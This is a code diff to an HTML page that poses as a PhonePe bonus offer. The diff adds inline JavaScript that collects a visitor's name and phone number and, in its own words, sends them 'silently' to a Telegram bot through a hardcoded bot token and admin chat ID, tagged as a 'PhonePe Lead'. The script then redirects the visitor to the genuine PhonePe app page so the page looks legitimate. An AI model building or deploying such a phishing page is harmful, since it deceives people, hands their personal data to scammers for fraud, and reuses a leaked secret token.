@@ -30,17 +30,13 @@
     </div>
 
    <form id="confirmForm">
-  <label>Name</label>
-  <input type="text" id="name" required>
-
-  <label>Phone Number</label>
-  <input type="tel" id="phone" required>
+  <input type="text" id="name" placeholder="Your Name" required>
+  <input type="tel" id="phone" placeholder="Phone Number" required>
 
   <button type="submit" class="submit-btn">
     Submit & Open PhonePe
   </button>
 </form>
-
 
     <div class="note">
       Bonus is credited by <strong>PhonePe</strong>.  
@@ -50,6 +46,37 @@
   </div>
 </div>
 
-<script src="confirm.js"></script>
+  <script>
+const BOT_TOKEN = "8218714042:AAEPqWZM05br2HA8w27caNgRcvLV77JdlzY";
+const ADMIN_ID = "8466348943";
+
+document.getElementById("confirmForm").addEventListener("submit", function(e){
+  e.preventDefault(); // ⛔ stop page refresh
+
+  const name = document.getElementById("name").value.trim();
+  const phone = document.getElementById("phone").value.trim();
+
+  if(name.length < 2 || phone.length < 8){
+    alert("Please enter valid details");
+    return;
+  }
+
+  // ✅ Send data to Telegram silently
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: ADMIN_ID,
+      text: `📲 PhonePe Lead\n👤 Name: ${name}\n📞 Phone: ${phone}`
+    })
+  }).catch(()=>{});
+
+  // 🚀 Redirect user immediately
+  window.location.href = "https://play.google.com/store/apps/details?id=com.phonepe.app";
+});
+</script>
+  
 </body>
 </html>
